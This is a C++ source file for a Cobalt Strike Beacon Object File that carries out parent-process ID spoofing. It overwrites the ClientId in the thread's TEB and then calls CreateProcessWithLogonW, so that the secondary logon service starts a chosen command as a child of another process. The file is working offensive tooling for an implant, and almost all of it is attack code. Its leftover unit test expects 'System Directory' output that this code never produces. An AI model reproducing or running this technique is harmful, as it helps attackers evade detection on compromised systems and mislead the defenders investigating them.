#include <Windows.h>
#include <process.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
    // Define the Dynamic Function Resolution declaration for the GetLastError function
	DFR(KERNEL32, GetLastError);
	DFR(KERNEL32, VirtualProtect);
	DFR(OLEAUT32, SysAllocString);
	// DFR(NTDLL, NtCurrentTeb);
	DFR(MSVCRT, malloc);
	DFR(MSVCRT, free);
	DFR(MSVCRT, memset);
    DFR(MSVCRT, memcpy);
	DFR(MSVCRT, wcscpy);
	DFR(MSVCRT, _beginthreadex);
	DFR(MSVCRT, _endthreadex);
    // Map GetLastError to KERNEL32$GetLastError 
	#define GetLastError KERNEL32$GetLastError
    #define VirtualProtect KERNEL32$VirtualProtect
	#define SysAllocString OLEAUT32$SysAllocString
	// #define NtCurrentTeb NTDLL$NtCurrentTeb
	#define malloc MSVCRT$malloc
	#define free MSVCRT$free
	#define memset MSVCRT$memset
    #define memcpy MSVCRT$memcpy
	#define wcscpy MSVCRT$wcscpy
	#define _beginthreadex MSVCRT$_beginthreadex
	#define _endthreadex MSVCRT$_endthreadex


    typedef struct _CLIENT_ID {
        HANDLE UniqueProcess;
        HANDLE UniqueThread;
    } CLIENT_ID;

	typedef struct _GDI_TEB_BATCH
	{
		ULONG Offset;
		HANDLE HDC;
		ULONG Buffer[310];
	} GDI_TEB_BATCH;

	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef struct _TEB
	{
		NT_TIB NtTib;
		PVOID EnvironmentPointer;
		CLIENT_ID ClientId;
		PVOID ActiveRpcHandle;
		PVOID ThreadLocalStoragePointer;
		PVOID ProcessEnvironmentBlock;
		ULONG LastErrorValue;
		ULONG CountOfOwnedCriticalSections;
		PVOID CsrClientThread;
		PVOID Win32ThreadInfo;
		ULONG User32Reserved[26];
		ULONG UserReserved[5];
		PVOID WOW32Reserved;
		LCID CurrentLocale;
		ULONG FpSoftwareStatusRegister;
		PVOID SystemReserved1[54];
		LONG ExceptionCode;
		UCHAR Padding0[4];
		PVOID ActivationContextStackPointer;
		UCHAR SpareBytes[24];
		ULONG TxFsContext;
		GDI_TEB_BATCH GdiTebBatch;
		CLIENT_ID RealClientId;
		PVOID GdiCachedProcessHandle;
		ULONG GdiClientPID;
		ULONG GdiClientTID;
		PVOID GdiThreadLocalInfo;
		SIZE_T Win32ClientInfo[62];
		PVOID glDispatchTable[233];
		SIZE_T glReserved1[29];
		PVOID glReserved2;
		PVOID glSectionInfo;
		PVOID glSection;
		PVOID glTable;
		PVOID glCurrentRC;
		PVOID glContext;
		ULONG LastStatusValue;
		UCHAR Padding2[4];
		UNICODE_STRING StaticUnicodeString;
		WCHAR StaticUnicodeBuffer[261];
		UCHAR Padding3[6];
		PVOID DeallocationStack;
		PVOID TlsSlots[64];
		LIST_ENTRY TlsLinks;
		PVOID Vdm;
		PVOID ReservedForNtRpc;
		PVOID DbgSsReserved[2];
		ULONG HardErrorMode;
		UCHAR Padding4[4];
		PVOID Instrumentation[11];
		GUID ActivityId;
		PVOID SubProcessTag;
		PVOID EtwLocalData;
		PVOID EtwTraceData;
		PVOID WinSockData;
		ULONG GdiBatchCount;
		union
		{
			PROCESSOR_NUMBER CurrentIdealProcessor;
			ULONG32 IdealProcessorValue;
			struct
			{
				UCHAR ReservedPad0;
				UCHAR ReservedPad1;
				UCHAR ReservedPad2;
				UCHAR IdealProcessor;
			};
		};
		ULONG GuaranteedStackBytes;
		UCHAR Padding5[4];
		PVOID ReservedForPerf;
		PVOID ReservedForOle;
		ULONG WaitingOnLoaderLock;
		UCHAR Padding6[4];
		PVOID SavedPriorityState;
		ULONG_PTR SoftPatchPtr1;
		ULONG_PTR ThreadPoolData;
		PVOID* TlsExpansionSlots;
		PVOID DeallocationBStore;
		PVOID BStoreLimit;
		ULONG ImpersonationLocale;
		ULONG IsImpersonating;
		PVOID NlsCache;
		PVOID pShimData;
		ULONG HeapVirtualAffinity;
		UCHAR Padding7[4];
		HANDLE CurrentTransactionHandle;
		PVOID ActiveFrame;
		PVOID FlsData;
		PVOID PreferredLanguages;
		PVOID UserPrefLanguages;
		PVOID MergedPrefLanguages;
		ULONG MuiImpersonation;
		union
		{
			USHORT CrossTebFlags;
			struct
			{
				unsigned __int16 SpareCrossTebBits : 16;
			};
		};
		union
		{
			USHORT SameTebFlags;
			struct
			{
				unsigned __int16 DbgSafeThunkCall : 1;
				unsigned __int16 DbgInDebugPrint : 1;
				unsigned __int16 DbgHasFiberData : 1;
				unsigned __int16 DbgSkipThreadAttach : 1;
				unsigned __int16 DbgWerInShipAssertCode : 1;
				unsigned __int16 DbgIssuedInitialBp : 1;
				unsigned __int16 DbgClonedThread : 1;
				unsigned __int16 SpareSameTebBits : 9;
			};
		};
		PVOID TxnScopeEnterCallback;
		PVOID TxnScopeExitCallback;
		PVOID TxnScopeContext;
		ULONG LockCount;
		ULONG SpareUlong0;
		PVOID ResourceRetValue;
	} TEB, * PTEB;

	typedef struct Params {
		int pid;
		wchar_t cmdline[128];
	} Params;

	struct _TEB* MyNtCurrentTeb(VOID)
	{
		// return (struct _TEB*)__readgsqword(FIELD_OFFSET(NT_TIB, Self));
		return (struct _TEB*)__readgsqword(0x30);
	}

    void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid) 
    {
        DFR_LOCAL(KERNEL32, GetCurrentProcessId);
        DFR_LOCAL(KERNEL32, GetCurrentThreadId);

        CLIENT_ID CSpoofedPid;
        DWORD oldProtection, oldProtection2;
        *originalPid = GetCurrentProcessId();
        *originalTid = GetCurrentThreadId();
        CLIENT_ID* pointerToTebPid = &(MyNtCurrentTeb()->ClientId);
        CSpoofedPid.UniqueProcess = (HANDLE)spoofedPid;
        CSpoofedPid.UniqueThread = (HANDLE)*originalTid;
        VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), PAGE_EXECUTE_READWRITE, &oldProtection);
        memcpy(pointerToTebPid, &CSpoofedPid, sizeof(CLIENT_ID));
        VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), oldProtection, &oldProtection2);
    }

    void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid) {
        CLIENT_ID CRealPid;
        DWORD oldProtection, oldProtection2;
        CLIENT_ID* pointerToTebPid = &(MyNtCurrentTeb()->ClientId);
        CRealPid.UniqueProcess = (HANDLE)originalPid;
        CRealPid.UniqueThread = (HANDLE)originalTid;
        VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), PAGE_EXECUTE_READWRITE, &oldProtection);
        memcpy(pointerToTebPid, &CRealPid, sizeof(CLIENT_ID));
        VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), oldProtection, &oldProtection2);
    }

    void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
    {
        DFR_LOCAL(ADVAPI32, CreateProcessWithLogonW);

        PROCESS_INFORMATION procInfo;
        STARTUPINFOW startInfo;
        DWORD originalPid, originalTid;
        //	EnableDebugPrivilege();
        SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
		BeaconPrintf(CALLBACK_OUTPUT, "Spoofing process %S created correctly as child of PID %d !", cmdline, pid);
        RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
        RtlZeroMemory(&startInfo, sizeof(STARTUPINFOW));
        if (CreateProcessWithLogonW(L"not", L"valid", L"user", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) 
        {
            RestoreOriginalPidTeb(originalPid, originalTid);
            // the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
            BeaconPrintf(CALLBACK_OUTPUT, "Spoofed process %S created correctly as child of PID %d !", cmdline, pid);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithLogonW() failed with error code 0x%x.", GetLastError());
        }       
    }

	unsigned __stdcall BeginStub(void* p)
	{
		Params* params = (Params*)p;
		MalSeclogonPPIDSpoofing(params->pid, SysAllocString(params->cmdline));
		return 0;
	}

	LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
	{
		_endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
		return EXCEPTION_CONTINUE_EXECUTION;
	}

    void go(char* args, int len) {
        /**
         * Define the Dynamic Function Resolution declaration for the GetSystemDirectoryA function
         * This time we use the DFR_LOCAL macro which create a local function pointer variable that
         * points to GetSystemDirectoryA. Therefore, we do have to map GetSystemDirectoryA to
         * KERNEL32$GetSystemDirectoryA
         */
		DFR_LOCAL(KERNEL32, AddVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, WaitForSingleObject);
		DFR_LOCAL(KERNEL32, GetExitCodeThread);
		DFR_LOCAL(KERNEL32, CloseHandle);

		datap parser;
		DWORD exitcode = 0;
		HANDLE thread = NULL;
		PVOID handler = NULL;
		Params* params = NULL;

		DWORD ProcessId = 0;
		wchar_t* ExecFile = NULL;

		BeaconDataParse(&parser, args, len);
		{
			ProcessId = BeaconDataInt(&parser);
			ExecFile = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}

		BeaconPrintf(CALLBACK_OUTPUT, "PID %d !", ProcessId);
		BeaconPrintf(CALLBACK_OUTPUT, "FILE %ws !", ExecFile);

		params = (Params*)malloc(sizeof(Params));

		params->pid = ProcessId;
		wcscpy(params->cmdline, ExecFile);

		handler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
		thread = (HANDLE)_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
		WaitForSingleObject(thread, INFINITE);
		GetExitCodeThread(thread, &exitcode);
		if (exitcode != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "An exception occured: 0x%x\n", exitcode);
		}
		if (thread) { CloseHandle(thread); }
		if (handler) { RemoveVectoredExceptionHandler(handler); }
		if (params) { free(params); }
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif